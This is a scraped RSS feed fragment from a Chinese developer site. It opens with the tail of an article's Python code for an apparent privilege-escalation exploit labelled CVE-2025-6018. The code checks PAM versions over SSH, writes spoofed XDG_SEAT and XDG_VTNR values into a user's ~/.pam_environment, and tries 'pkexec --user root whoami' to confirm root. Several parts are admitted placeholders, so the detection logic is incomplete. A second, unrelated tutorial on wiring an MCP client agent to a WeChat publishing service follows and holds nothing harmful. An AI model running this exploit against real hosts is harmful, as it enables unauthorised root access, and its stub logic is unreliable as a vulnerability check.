            <span class="hljs-string">"pam-1.3.0"</span>, <span class="hljs-string">"pam-1.3.1"</span>, <span class="hljs-string">"pam-1.4.0"</span>, <span class="hljs-string">"pam-1.5.0"</span>, 
            <span class="hljs-string">"pam-1.5.1"</span>, <span class="hljs-string">"pam-1.5.2"</span>, <span class="hljs-string">"pam-1.5.3"</span>, <span class="hljs-string">"pam-1.6.0"</span>
        ]
        
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">check_vulnerability</span>(<span class="hljs-params">self, client</span>):
        <span class="hljs-string">"""增强的漏洞检测函数，通过SSH客户端在远程主机执行多项检查"""</span>
        logger.info(<span class="hljs-string">"Starting vulnerability assessment"</span>)
        
        <span class="hljs-comment"># 定义需要执行的检查命令字典</span>
        checks = {
            <span class="hljs-string">"pam_version"</span>: <span class="hljs-string">"rpm -q pam || dpkg -l | grep libpam"</span>, <span class="hljs-comment"># 检查PAM安装包版本</span>
            <span class="hljs-string">"pam_env"</span>: <span class="hljs-string">"find /etc/pam.d/ -name '*' -exec grep -l 'pam_env' {} \\; 2&gt;/dev/null"</span>, <span class="hljs-comment"># 查找使用pam_env的PAM配置</span>
            <span class="hljs-string">"pam_systemd"</span>: <span class="hljs-string">"find /etc/pam.d/ -name '*' -exec grep -l 'pam_systemd' {} \\; 2&gt;/dev/null"</span>, <span class="hljs-comment"># 查找使用pam_systemd的PAM配置</span>
            <span class="hljs-string">"systemd_version"</span>: <span class="hljs-string">"systemctl --version | head -1"</span> <span class="hljs-comment"># 检查SystemD版本</span>
        }

        vulnerable = <span class="hljs-literal">False</span>
        
        <span class="hljs-keyword">for</span> check_name, command <span class="hljs-keyword">in</span> checks.items():
            <span class="hljs-keyword">try</span>:
                <span class="hljs-comment"># 通过SSH连接执行命令</span>
                stdin, stdout, stderr = client.exec_command(command)
                output = stdout.read().decode(<span class="hljs-string">'utf-8'</span>).strip()
                error = stderr.read().decode(<span class="hljs-string">'utf-8'</span>).strip()
                
                <span class="hljs-keyword">if</span> output:
                    logger.info(<span class="hljs-string">f"<span class="hljs-subst">{check_name}</span>: <span class="hljs-subst">{output}</span>"</span>)
                    <span class="hljs-comment"># 关键逻辑：检查pam_env是否在pam_systemd之前被加载</span>
                    <span class="hljs-keyword">if</span> check_name == <span class="hljs-string">"pam_env"</span> <span class="hljs-keyword">and</span> <span class="hljs-string">"sshd"</span> <span class="hljs-keyword">in</span> output:
                        <span class="hljs-comment"># 这里需要进一步分析/etc/pam.d/sshd文件的具体行顺序</span>
                        <span class="hljs-comment"># 简化示例：假设检测到该文件即进行下一步详细检查</span>
                        logger.warning(<span class="hljs-string">"pam_env found in sshd config. Checking order..."</span>)
                        <span class="hljs-comment"># 实际代码中应添加解析文件判断顺序的逻辑</span>
                <span class="hljs-keyword">elif</span> error:
                    logger.debug(<span class="hljs-string">f"<span class="hljs-subst">{check_name}</span> error: <span class="hljs-subst">{error}</span>"</span>)
                <span class="hljs-keyword">else</span>:
                    logger.debug(<span class="hljs-string">f"<span class="hljs-subst">{check_name}</span>: No output"</span>)
                    
            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
                logger.error(<span class="hljs-string">f"Failed to execute <span class="hljs-subst">{check_name}</span> check: <span class="hljs-subst">{e}</span>"</span>)
        
        <span class="hljs-comment"># 版本匹配逻辑（示例框架）</span>
        <span class="hljs-comment"># 实际应从`pam_version`检查的输出中提取版本号与`vulnerable_versions`列表对比</span>
        logger.info(<span class="hljs-string">"Vulnerability check completed."</span>)
        <span class="hljs-comment"># 返回True/False表示漏洞是否存在</span>
        <span class="hljs-keyword">return</span> vulnerable
</code></pre>
<pre><code class="hljs language-python" lang="python">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>(<span class="hljs-params">self, client, username</span>):
        <span class="hljs-string">"""执行漏洞利用的主要函数，尝试注入环境变量并提升权限"""</span>
        logger.info(<span class="hljs-string">f"Attempting exploit for user: <span class="hljs-subst">{username}</span>"</span>)
        
        <span class="hljs-comment"># 1. 创建或修改 ~/.pam_environment 文件，注入恶意环境变量</span>
        pam_env_content = <span class="hljs-string">"""
        # Injected by CVE-2025-6018 exploit
        XDG_SEAT=seat0
        XDG_VTNR=1
        # 可添加其他用于欺骗会话类型的变量
        """</span>
        pam_env_path = <span class="hljs-string">f"/home/<span class="hljs-subst">{username}</span>/.pam_environment"</span>  <span class="hljs-comment"># 假设用户主目录在/home下</span>
        
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># 通过SSH将内容写入文件</span>
            command = <span class="hljs-string">f"echo '<span class="hljs-subst">{pam_env_content}</span>' &gt; <span class="hljs-subst">{pam_env_path}</span>"</span>
            stdin, stdout, stderr = client.exec_command(command)
            <span class="hljs-comment"># 检查命令是否成功执行</span>
            exit_status = stdout.channel.recv_exit_status()
            <span class="hljs-keyword">if</span> exit_status == <span class="hljs-number">0</span>:
                logger.info(<span class="hljs-string">f"Successfully created/overwritten <span class="hljs-subst">{pam_env_path}</span>"</span>)
            <span class="hljs-keyword">else</span>:
                error = stderr.read().decode()
                logger.error(<span class="hljs-string">f"Failed to write pam_environment: <span class="hljs-subst">{error}</span>"</span>)
                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
                
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            logger.error(<span class="hljs-string">f"Error during file creation: <span class="hljs-subst">{e}</span>"</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
            
        <span class="hljs-comment"># 2. 触发PAM重新读取环境变量（例如，通过建立新的SSH会话或重新登录）</span>
        <span class="hljs-comment"># 注意：在实际利用中，可能需要用户注销并重新登录，或者工具需要创建新的SSH连接来触发新会话。</span>
        logger.warning(<span class="hljs-string">"Environment variable injected. A new login session (e.g., new SSH connection) may be required for the changes to take effect."</span>)
        
        <span class="hljs-comment"># 3. 尝试利用伪造的“活动用户”身份执行特权操作（示例：通过pkexec）</span>
        <span class="hljs-comment"># 这需要结合CVE-2025-6019或其它Polkit策略</span>
        <span class="hljs-comment"># 示例命令：尝试运行一个需要`allow_active`权限的Polkit动作</span>
        test_command = <span class="hljs-string">"pkexec --user root whoami"</span>  <span class="hljs-comment"># 只是一个示例，实际命令取决于目标策略</span>
        
        <span class="hljs-keyword">try</span>:
            stdin, stdout, stderr = client.exec_command(test_command)
            output = stdout.read().decode().strip()
            error = stderr.read().decode().strip()
            
            <span class="hljs-keyword">if</span> output == <span class="hljs-string">"root"</span>:
                logger.critical(<span class="hljs-string">"SUCCESS: Obtained root privileges!"</span>)
                <span class="hljs-comment"># 可以在此处提供交互式shell或执行后续payload</span>
                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
            <span class="hljs-keyword">else</span>:
                logger.info(<span class="hljs-string">"Exploit attempted, but root not obtained. Output: %s, Error: %s"</span>, output, error)
                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
                
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            logger.error(<span class="hljs-string">f"Failed to execute privilege test: <span class="hljs-subst">{e}</span>"</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
</code></pre>
<p>6HFtX5dABrKlqXeO5PUv/ydjQZDJ7Ct83xG1NG8fcAM1WcosLlSccXIf2HKuEYUi</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[自己写一个智能体-使用MCP服务]]></title>    <link>https://juejin.cn/post/7595393113552666639</link>    <guid>https://juejin.cn/post/7595393113552666639</guid>    <pubDate>2026-01-15T08:12:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595393113552666639" data-draft-id="7539179280716201994" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="自己写一个智能体-使用MCP服务"/> <meta itemprop="keywords" content="Agent,MCP"/> <meta itemprop="datePublished" content="2026-01-15T08:12:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="路边的阿不"/> <meta itemprop="url" content="https://juejin.cn/user/1066942081532212"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            自己写一个智能体-使用MCP服务
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1066942081532212/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    路边的阿不
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T08:12:26.000Z" title="Thu Jan 15 2026 08:12:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>还记得我们在<a href="https://link.juejin.cn?target=https%3A%2F%2Fbabyno.top%2Fposts%2F2024%2F12%2Fwrite-your-own-agent---theory%2F" target="_blank" title="https://babyno.top/posts/2024/12/write-your-own-agent---theory/" ref="nofollow noopener noreferrer">上一篇文章</a>中聊过的“智能体”理论吗？</p>
<p>我们提到，智能体之所以比单纯的语言模型强大，是因为它拥有了“手”和“脚”——也就是<strong>使用工具的能力</strong>。</p>
<blockquote>
<p>智能体 = 大语言模型（大脑） + 规划（前额叶） + 工具（手脚）</p>
</blockquote>
<p>理论说得再多，终究要落地。今天我们就来聊聊如何通过 <strong>MCP (Model Context Protocol)</strong> 协议，真正的让你的智能体“动”起来。我们将以一个实际场景为例：<strong>写一段代码，让AI自动把一篇文章发布到微信公众号。</strong></p>
<h2 data-id="heading-0">什么是 MCP？</h2>
<p>在开始写代码之前，得先解决一个痛点。</p>
<p>以前我们要让 GPT 连接外部工具（比如读取文件、搜索网页、操作数据库），通常需要针对不同的 API 写一大堆胶水代码。如果你用 <code>LangChain</code>，你得遵循它的接口规范；如果你换个框架，可能全得重写。</p>
<p><strong>MCP (Model Context Protocol)</strong> 就是 AI 时代的 <strong>USB-C 接口</strong>。它是由 Anthropic 等公司推动的一个开放标准。</p>
<ul>
<li><strong>MCP Server</strong>：提供工具（比如：文件读取服务、微信发布服务）。</li>
<li><strong>MCP Client</strong>：也就是我们的智能体（负责连接模型和服务端）。</li>
<li><strong>LLM</strong>：负责决策调用哪个工具。</li>
</ul>
<p>只要大家遵循这个协议，你的智能体就可以无缝连接任何支持 MCP 的工具，而不需要关心底层的具体实现。</p>
<h2 data-id="heading-1">实战：构建公众号发布智能体</h2>
<p>接下来，我们通过一段 <code>Node.js</code> 代码，演示如何把一个本地 Markdown 文件，通过 MCP 服务发布到微信公众号。</p>
<h3 data-id="heading-2">1. 准备工作</h3>
<p>在这个例子中，我们需要三个角色的配合：</p>
<ol>
<li><strong>大脑</strong>：一个支持 Function Calling 的大模型（如 GPT-4o 或 DeepSeek 等兼容 OpenAI 格式的模型）。</li>
<li><strong>工具箱 (MCP Server)</strong>：这里我们使用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcaol64%2Fwenyan-mcp" target="_blank" title="https://github.com/caol64/wenyan-mcp" ref="nofollow noopener noreferrer"><code>文颜 MCP</code></a>，这是一个封装了微信公众号发布功能的 MCP 服务，我们通过 Docker 运行它。</li>
<li><strong>智能体 (MCP Client)</strong>：我们自己写的这段 JS 代码。</li>
</ol>
<h3 data-id="heading-3">2. 连接 MCP 服务</h3>
<p>首先，我们需要建立与 MCP Server 的连接。在代码中，我们通过 <code>StdioClientTransport</code> 来启动一个 Docker 容器作为我们的工具服务。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">Client</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"@modelcontextprotocol/sdk/client/index.js"</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">StdioClientTransport</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"@modelcontextprotocol/sdk/client/stdio.js"</span>;

<span class="hljs-comment">// ... 环境变量检查代码 ...</span>

<span class="hljs-keyword">const</span> pwd = process.<span class="hljs-title function_">cwd</span>();
<span class="hljs-comment">// 建立传输通道：通过 Docker 运行 wenyan-mcp 服务</span>
<span class="hljs-keyword">const</span> transport = <span class="hljs-keyword">new</span> <span class="hljs-title class_">StdioClientTransport</span>({
    <span class="hljs-attr">command</span>: <span class="hljs-string">"docker"</span>,
    <span class="hljs-attr">args</span>: [
        <span class="hljs-string">"run"</span>,
        <span class="hljs-string">"--rm"</span>,
        <span class="hljs-string">"-i"</span>,             <span class="hljs-comment">// 必须开启交互模式，以便通过 stdio 通信</span>
        <span class="hljs-string">"--env-file"</span>, <span class="hljs-string">".env.test"</span>, <span class="hljs-comment">// 传入公众号的 AppID 等凭证</span>
        <span class="hljs-string">"-e"</span>, <span class="hljs-string">`HOST_FILE_PATH=<span class="hljs-subst">${pwd}</span>`</span>,
        <span class="hljs-string">"-v"</span>, <span class="hljs-string">`<span class="hljs-subst">${pwd}</span>:/mnt/host-downloads`</span>, <span class="hljs-comment">// 挂载目录，让容器能读取到文章</span>
        <span class="hljs-string">"caol64/wenyan-mcp"</span>,
    ],
});

<span class="hljs-keyword">const</span> client = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Client</span>(
    { <span class="hljs-attr">name</span>: <span class="hljs-string">"wenyan-client"</span>, <span class="hljs-attr">version</span>: <span class="hljs-string">"1.0.0"</span> },
    { <span class="hljs-attr">capabilities</span>: {} }
);

<span class="hljs-keyword">await</span> client.<span class="hljs-title function_">connect</span>(transport);
</code></pre>
<p>这段代码对应了上一篇提到的**“工具使用”**的前提——智能体得先能拿得起工具。</p>
<h3 data-id="heading-4">3. 获取工具列表</h3>
<p>连接成功后，智能体需要知道自己有哪些工具可用。这对应了理论篇中的**“问题分类”**准备阶段，只有知道有哪些工具，模型才能决定用哪个。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 获取 MCP 服务端提供的所有工具</span>
<span class="hljs-keyword">const</span> mcpResponse = <span class="hljs-keyword">await</span> client.<span class="hljs-title function_">listTools</span>();

<span class="hljs-comment">// 将 MCP 的工具定义转换为 OpenAI 兼容的 Function Calling 格式</span>
<span class="hljs-keyword">const</span> openaiTools = mcpResponse.<span class="hljs-property">tools</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">tool</span>) =&gt;</span> ({
    <span class="hljs-attr">type</span>: <span class="hljs-string">"function"</span>,
    <span class="hljs-attr">function</span>: {
        <span class="hljs-attr">name</span>: tool.<span class="hljs-property">name</span>,
        <span class="hljs-attr">description</span>: tool.<span class="hljs-property">description</span>,
        <span class="hljs-attr">parameters</span>: tool.<span class="hljs-property">inputSchema</span>, <span class="hljs-comment">// MCP 的 schema 通常直接兼容</span>
    },
}));
</code></pre>
<p>此时，<code>openaiTools</code> 里就装满了诸如 <code>publish_article</code> 之类的方法描述。</p>
<h3 data-id="heading-5">4. 思考与决策</h3>
<p>现在进入核心环节。我们将文章内容和需求告诉 LLM，让它自己判断该做什么。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> llmClient = <span class="hljs-keyword">new</span> <span class="hljs-title class_">OpenAI</span>({ <span class="hljs-attr">apiKey</span>: <span class="hljs-variable constant_">LLM_API_KEY</span>, <span class="hljs-attr">baseURL</span>: <span class="hljs-variable constant_">LLM_BASE_URL</span> });
<span class="hljs-keyword">const</span> content = <span class="hljs-string">"./test/publish.md"</span>; <span class="hljs-comment">// 待发布的文章路径</span>

<span class="hljs-comment">// 用户的指令：既包含了目标（发布），也包含了参数（使用 phycat 主题）</span>
<span class="hljs-keyword">const</span> userPrompt = { 
    <span class="hljs-attr">role</span>: <span class="hljs-string">"user"</span>, 
    <span class="hljs-attr">content</span>: <span class="hljs-string">`使用phycat主题将这篇文章发布到微信公众号：\n\n<span class="hljs-subst">${content}</span>`</span> 
};

<span class="hljs-comment">// 第一轮对话：询问 LLM</span>
<span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> llmClient.<span class="hljs-property">chat</span>.<span class="hljs-property">completions</span>.<span class="hljs-title function_">create</span>({
    <span class="hljs-attr">model</span>: <span class="hljs-variable constant_">LLM_MODEL</span>,
    <span class="hljs-attr">messages</span>: [userPrompt],
    <span class="hljs-attr">tools</span>: openaiTools, <span class="hljs-comment">// 把工具箱展示给它</span>
    <span class="hljs-attr">tool_choice</span>: <span class="hljs-string">"auto"</span>, <span class="hljs-comment">// 让模型自己决定是否用工具</span>
});
</code></pre>
<p>在这里，模型会分析 <code>userPrompt</code>。它发现你的意图是“发布”，并且它看到了 <code>openaiTools</code> 里有一个能发布的工具，于是它不会直接回答“好的”，而是会返回一个 <code>tool_calls</code> 请求。</p>
<h3 data-id="heading-6">5. 执行工具与反馈</h3>
<p>智能体捕获到模型的调用请求，真正的去执行操作，并将结果反馈给模型。这就是**“优化答案”**的前奏。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> assistantMessage = response.<span class="hljs-property">choices</span>[<span class="hljs-number">0</span>].<span class="hljs-property">message</span>;

<span class="hljs-keyword">if</span> (assistantMessage.<span class="hljs-property">tool_calls</span>) {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> toolCall <span class="hljs-keyword">of</span> assistantMessage.<span class="hljs-property">tool_calls</span>) {
        <span class="hljs-keyword">const</span> name = toolCall.<span class="hljs-property">function</span>.<span class="hljs-property">name</span>;
        <span class="hljs-keyword">const</span> args = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(toolCall.<span class="hljs-property">function</span>.<span class="hljs-property">arguments</span>);

        <span class="hljs-comment">// 关键步骤：通过 MCP Client 真正的调用 Docker 里的服务</span>
        <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> client.<span class="hljs-title function_">callTool</span>({
            <span class="hljs-attr">name</span>: name,
            <span class="hljs-attr">arguments</span>: args,
        });

        <span class="hljs-comment">// 获取工具执行结果（比如：发布成功的链接）</span>
        <span class="hljs-keyword">const</span> toolContent = result.<span class="hljs-property">content</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> item.<span class="hljs-property">text</span>).<span class="hljs-title function_">join</span>(<span class="hljs-string">"\n"</span>);
        
        <span class="hljs-comment">// 将结果拼接回对话历史</span>
        <span class="hljs-keyword">const</span> finalMessages = [
            userPrompt,
            assistantMessage,
            {
                <span class="hljs-attr">role</span>: <span class="hljs-string">"tool"</span>,
                <span class="hljs-attr">tool_call_id</span>: toolCall.<span class="hljs-property">id</span>,
                <span class="hljs-attr">content</span>: toolContent,
            },
        ];

        <span class="hljs-comment">// 第二轮对话：让 LLM 根据工具执行结果给用户一个最终回复</span>
        <span class="hljs-keyword">const</span> finalResponse = <span class="hljs-keyword">await</span> llmClient.<span class="hljs-property">chat</span>.<span class="hljs-property">completions</span>.<span class="hljs-title function_">create</span>({
            <span class="hljs-attr">model</span>: <span class="hljs-variable constant_">LLM_MODEL</span>,
            <span class="hljs-attr">messages</span>: finalMessages,
        });

        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(finalResponse.<span class="hljs-property">choices</span>[<span class="hljs-number">0</span>].<span class="hljs-property">message</span>.<span class="hljs-property">content</span>);
    }
}
</code></pre>
<h2 data-id="heading-7">发生了什么？</h2>
<p>让我们回顾一下整个流程：</p>
<ol>
<li><strong>User</strong>: "帮我把 <code>publish.md</code> 发到公众号。"</li>
<li><strong>LLM</strong>: (思考：我不能直接操作微信，但我有一个叫 <code>publish_article</code> 的工具。我需要提取参数：文件路径和主题。) -&gt; <strong>发出指令</strong>。</li>
<li><strong>Agent (JS代码)</strong>: 收到指令，通过 MCP 协议告诉 Docker 容器里的服务：“嘿，运行一下这个函数”。</li>
<li><strong>MCP Server</strong>: 执行实际的 API 调用，转换 Markdown，上传素材，保存到草稿箱，返回结果：“发布成功，文章链接是 xxx”。</li>
<li><strong>LLM</strong>: 收到结果，组织语言。 -&gt; <strong>最终回复</strong>: "您的文章已成功发布，使用了 phycat 主题，链接如下：xxx。"</li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e418e70b48dc479692143f5fda320500~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Lev6L6555qE6Zi_5LiN:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769069546&amp;x-signature=anCTzNVjdAK9dbI%2FrlfT2Z18Uy4%3D" alt="mcp-workflow" loading="lazy"/></p>
<h2 data-id="heading-8">总结</h2>
<p>通过引入 MCP，我们把“智能体”的代码写得非常通用。</p>
<p>注意到了吗？上面这段代码里，<strong>没有任何一行是关于微信 API 的具体实现的</strong>。如果不加载 <code>wenyan-mcp</code>，而是换成一个 <code>filesystem-mcp</code>，这段代码逻辑几乎不用变，智能体就能拥有操作文件的能力。</p>
<p>这就是现代智能体架构的魅力：<strong>大模型负责逻辑，MCP 负责能力，智能体程序负责连接。</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>